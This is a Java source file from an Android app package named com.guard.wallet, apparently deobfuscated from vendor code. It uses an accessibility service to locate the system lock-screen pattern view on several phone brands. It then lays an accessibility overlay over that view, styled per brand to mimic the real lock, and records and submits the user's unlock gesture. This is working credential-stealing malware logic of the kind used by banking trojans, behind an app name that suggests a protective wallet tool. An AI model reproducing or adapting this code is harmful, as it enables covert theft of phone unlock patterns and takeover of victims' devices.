package com.guard.wallet.helper;

import com.guard.wallet.core.AppUtils;

import android.graphics.Color;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 悬浮窗图案锁视图管理器 — 管理锁屏图案解锁悬浮窗的创建、显示和移除。
 *
 * <p>核心职责:
 * <ul>
 *   <li>创建并显示透明图案锁悬浮窗（WindowManager overlay, type 2032）</li>
 *   <li>根据设备品牌（OPPO/vivo/Samsung/华为等）配置不同的图案锁样式</li>
 *   <li>管理图案锁监听状态（创建/移除/回收）</li>
 *   <li>通过 CombineFilter 在无障碍树中定位目标图案锁控件</li>
 * </ul>
 *
 * <p>vendor 原始路径: com/guard/wallet/helper/o.java
 */
public abstract class OverlayViewHelper {
    private static final String TAG = "com.guard.wallet.helper.o";

    /** WindowManager 实例（用于添加/移除悬浮窗视图） */
    public static WindowManager a;

    /** 图案锁插件实例（存储手势坐标和回调） */
    public static final com.guard.wallet.plug.GesturePatternCollector b = new com.guard.wallet.plug.GesturePatternCollector();

    /** 可重入锁（保护悬浮窗创建/移除的线程安全） */
    public static final ReentrantLock c = new ReentrantLock();

    /** 订阅 ID 队列（跟踪当前监听请求） */
    public static final ConcurrentLinkedQueue<String> d = new ConcurrentLinkedQueue<>();

    /** 当前活跃的 CombineFilter（用于定位图案锁控件） */
    public static final AtomicReference<CombineFilter> e = new AtomicReference<>();

    /** 当前悬浮窗视图引用（PatternLockView 实例） */
    public static final AtomicReference<Object> f = new AtomicReference<>();

    /** 创建 OPPO ColorOS 图案锁过滤器 */
    public static CombineFilter a() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/colorLockPatternView", null, null, null, null));
        return combineFilter;
    }

    /** 创建 AOSP 标准图案锁过滤器 */
    public static CombineFilter b() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/lockPatternView", null, null, null, null));
        return combineFilter;
    }

    /**
     * 创建图案锁悬浮窗并添加到 WindowManager。
     *
     * @param eVarObj  无障碍代理对象（用于在无障碍树中查找控件）
     * @param reqListenHelper 监听请求（包含订阅 ID）
     */
    // ADAPT: vendor uses o.e (delegate type) but that clashes with this class name in Java.
    // Using Object parameter type with EngineHelper bridge for delegate method calls.
    public static void c(Object eVarObj, ReqListenHelper reqListenHelper) {
        try {
            UiObject g2 = g(eVarObj);
            if (g2 == null) {
                return;
            }
            com.guard.wallet.plug.GesturePatternCollector dVar = b;
            dVar.patternPoints.clear();
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 4786090;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.05f;
            j(layoutParams, g2.boundsInScreen());
            com.guard.wallet.patternlock.PatternLockView hVar = new com.guard.wallet.patternlock.PatternLockView(MyAccessibilityService.P());
            hVar.setAspectRatioEnabled(true);
            hVar.setInputEnabled(true);
            hVar.setDotCount(3);
            k(hVar);
            hVar.setSystemUiVisibility(4);
            hVar.setImportantForAccessibility(2);
            if (Build.VERSION.SDK_INT >= 30) {
                hVar.setImportantForContentCapture(2);
            }
            hVar.t.add(new com.guard.wallet.patternlock.PatternLock(hVar));
            if (a == null) {
                a = (WindowManager) MyAccessibilityService.P().getSystemService("window");
            }
            layoutParams.type = 2032;
            AtomicReference<Object> atomicReference = f;
            if (atomicReference.get() != null) {
                return;
            }
            a.addView(hVar, layoutParams);
            atomicReference.set(hVar);
            d.offer(AppUtils.B(reqListenHelper.getSubscribeId()) ? "NULL_REQ_LISTEN_HELPER" : reqListenHelper.getSubscribeId());
            dVar.listenHelper = reqListenHelper;
            Log.d(TAG, "patternLockView \u521b\u5efa\u5b8c\u6210");
        } catch (Exception e2) {
            AppUtils.s(TAG, e2);
        }
    }

    /**
     * 启动图案锁监听 — 检查前置条件后创建悬浮窗。
     *
     * @param eVarObj         无障碍代理对象
     * @param combineFilter   控件过滤器
     * @param reqListenHelper 监听请求
     */
    public static void d(Object eVarObj, CombineFilter combineFilter, ReqListenHelper reqListenHelper) {
        try {
            if (MyAccessibilityService.P() == null || i() || !d.isEmpty()) {
                return;
            }
            ReentrantLock reentrantLock = c;
            if (!reentrantLock.tryLock()) {
                return;
            }
            try {
                e.set(combineFilter);
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    c(eVarObj, reqListenHelper);
                } else {
                    new Handler(Looper.getMainLooper()).postDelayed(new com.guard.wallet.delegate.task.DelegateEventDispatcher(eVarObj, reqListenHelper, 7), 300L);
                }
            } finally {
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AppUtils.s(TAG, e2);
        }
        i();
    }

    /** 移除图案锁悬浮窗并清理状态 */
    public static void e() {
        try {
            WindowManager windowManager = a;
            AtomicReference<Object> atomicReference = f;
            if (windowManager != null && atomicReference.get() != null) {
                Log.d(TAG, "removeViewImmediate patternView");
                a.removeViewImmediate((View) atomicReference.get());
                ((com.guard.wallet.patternlock.PatternLockView) atomicReference.get()).c();
            }
            e.set(null);
            atomicReference.set(null);
            d.clear();
            Log.d(TAG, "isPatternListening:" + i());
        } catch (Exception e2) {
            AppUtils.s(TAG, e2);
        }
    }

    /**
     * 完成图案锁监听 — 处理结果并移除悬浮窗。
     *
     * @param str 订阅 ID
     * @param z2  是否为成功结果
     */
    public static void f(String str, boolean z2) {
        try {
            ReentrantLock reentrantLock = c;
            if (!reentrantLock.tryLock()) {
                return;
            }
            try {
                com.guard.wallet.plug.GesturePatternCollector dVar = b;
                if (!z2) {
                    dVar.patternPoints.clear();
                } else if (AppUtils.B(str)) {
                    dVar.submitPattern();
                } else {
                    dVar.cipherCodeRef.set(str);
                    dVar.submitPattern();
                }
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    e();
                } else {
                    new Handler(Looper.getMainLooper()).post(new DelayedRunnable(3));
                }
            } finally {
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AppUtils.s(TAG, e2);
        }
        i();
    }

    /**
     * 在无障碍树中查找图案锁控件。
     * 依次尝试: 自定义过滤器 -> OPPO -> vivo -> AOSP 标准。
     */
    public static UiObject g(Object eVarObj) {
        try {
            AtomicReference<CombineFilter> atomicReference = e;
            if (atomicReference.get() != null) {
                UiObject n2 = EngineHelper.delegateN(eVarObj, atomicReference.get());
                if (n2 != null) {
                    UiObject findOneByCombine = n2.findOneByCombine(atomicReference.get());
                    if (findOneByCombine != null) {
                        return findOneByCombine;
                    }
                }
                if (MyAccessibilityService.Q() != null) {
                    UiObject findOneByCombine2 = MyAccessibilityService.Q().findOneByCombine(atomicReference.get());
                    if (findOneByCombine2 != null) {
                        return findOneByCombine2;
                    }
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                UiObject n3 = EngineHelper.delegateN(eVarObj, a());
                if (n3 != null) {
                    UiObject findOneByCombine3 = n3.findOneByCombine(a());
                    if (findOneByCombine3 != null) {
                        return findOneByCombine3;
                    }
                }
                if (MyAccessibilityService.Q() != null) {
                    return MyAccessibilityService.Q().findOneByCombine(a());
                }
                return null;
            }
            if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                UiObject n4 = EngineHelper.delegateN(eVarObj, l());
                if (n4 != null) {
                    UiObject findOneByCombine4 = n4.findOneByCombine(l());
                    if (findOneByCombine4 != null) {
                        return findOneByCombine4;
                    }
                }
                if (MyAccessibilityService.Q() != null) {
                    return MyAccessibilityService.Q().findOneByCombine(l());
                }
                return null;
            }
            UiObject n5 = EngineHelper.delegateN(eVarObj, b());
            if (n5 != null) {
                UiObject findOneByCombine5 = n5.findOneByCombine(b());
                if (findOneByCombine5 != null) {
                    return findOneByCombine5;
                }
            }
            if (MyAccessibilityService.Q() != null) {
                return MyAccessibilityService.Q().findOneByCombine(b());
            }
            return null;
        } catch (Exception e2) {
            AppUtils.s(TAG, e2);
            return null;
        }
    }

    /** 检查图案锁插件是否有待处理的手势数据 */
    public static boolean h() {
        com.guard.wallet.plug.GesturePatternCollector dVar = b;
        return dVar.listenHelper != null && !dVar.patternPoints.isEmpty();
    }

    /** 检查图案锁悬浮窗是否正在显示 */
    public static boolean i() {
        return f.get() != null && a != null;
    }

    /** 配置悬浮窗布局参数（位置和尺寸对齐目标控件） */
    public static void j(WindowManager.LayoutParams layoutParams, Rect rect) {
        layoutParams.gravity = 8388659;
        layoutParams.x = rect.left;
        layoutParams.y = rect.top;
        layoutParams.width = rect.width();
        layoutParams.height = rect.height();
        Log.d(TAG, "screenWidth:" + rect.width());
        Log.d(TAG, "screenHeight:" + rect.height());
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
        Log.d(TAG, "StatusBarHeight:" + metrics.getStatusBarHeight());
    }

    /** 根据设备品牌配置图案锁视图样式（点大小、路径宽度、颜色等） */
    public static void k(com.guard.wallet.patternlock.PatternLockView hVar) {
        boolean i2 = com.guard.wallet.utils.DeviceUtils.isOppoFamily();
        com.guard.wallet.patternlock.PatternListener eVar = com.guard.wallet.patternlock.PatternListener.h;
        if (i2) {
            hVar.setNormalStateColor(-7829368);
            hVar.setDotNormalSize(30);
            hVar.setDotSelectedSize(60);
            hVar.setPathWidth(10);
            hVar.setPathColor(-1);
            hVar.setAspectRatio(1);
        } else {
            if (Build.BRAND.equalsIgnoreCase("samsung")) {
                hVar.setNormalStateColor(-3355444);
                hVar.setDotNormalSize(36);
                hVar.setDotSelectedSize(50);
                hVar.setPathWidth(10);
                hVar.setPathColor(-1);
                hVar.setAspectRatio(0);
                hVar.setDotAlign(eVar);
                hVar.setDotAnimationDuration(100);
                hVar.setPathEndAnimationDuration(200);
                return;
            }
            if (com.guard.wallet.utils.DeviceUtils.isHuaweiOrHonor()) {
                hVar.setNormalStateColor(-1);
                hVar.setDotNormalSize(32);
                hVar.setDotSelectedSize(50);
                hVar.setDotSelectedColor(-1);
                hVar.setPathWidth(20);
                hVar.setPathColor(-7829368);
            } else if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                hVar.setNormalStateColor(-3355444);
                hVar.setDotSelectedSize(40);
                hVar.setDotSelectedColor(-256);
                hVar.setPathWidth(30);
                hVar.setPathColor(Color.parseColor("#FFF68F"));
                hVar.setAspectRatio(0);
                hVar.setDotNormalSize(20);
            } else if (!com.guard.wallet.utils.DeviceUtils.isXiaomiFamily() && !com.guard.wallet.utils.DeviceUtils.isTecnoFamily()) {
                hVar.setNormalStateColor(-16777216);
                hVar.setDotNormalSize(30);
                hVar.setDotSelectedSize(60);
                hVar.setDotSelectedColor(-16777216);
                hVar.setPathWidth(40);
                hVar.setPathColor(Color.argb(204, 0, 101, 140));
                hVar.setAspectRatio(0);
                hVar.setDotAlign(eVar);
                hVar.setDotAnimationDuration(50);
                hVar.setPathEndAnimationDuration(50);
                return;
            } else {
                hVar.setNormalStateColor(-1);
                hVar.setDotNormalSize(20);
                hVar.setDotSelectedSize(30);
                hVar.setDotSelectedColor(-1);
                hVar.setPathWidth(5);
                hVar.setPathColor(-1);
            }
            hVar.setAspectRatio(0);
        }
        hVar.setDotAlign(eVar);
        hVar.setDotAnimationDuration(150);
        hVar.setPathEndAnimationDuration(100);
    }

    /** 创建 vivo 图案锁过滤器 */
    public static CombineFilter l() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_lock_pattern_view", null, null, null, null));
        return combineFilter;
    }

    /** 内部 Runnable — 用于将图案锁/触摸任务投递到主线程执行 */
    public static class d implements Runnable {
        public final Object a;
        public final Object b;
        public final int c;

        public d(Object a, Object b, int c) {
            this.a = a;
            this.b = b;
            this.c = c;
        }

        @Override
        public void run() {
            try {
                switch (c) {
                    case 7:
                        OverlayViewHelper.c(a, (ReqListenHelper) b);
                        break;
                    case 8:
                        AutomationHelper.d(a, (CombineFilter) b);
                        break;
                    default:
                        break;
                }
            } catch (Exception ex) {
                AppUtils.s(TAG + ".d", ex);
            }
        }
    }
}
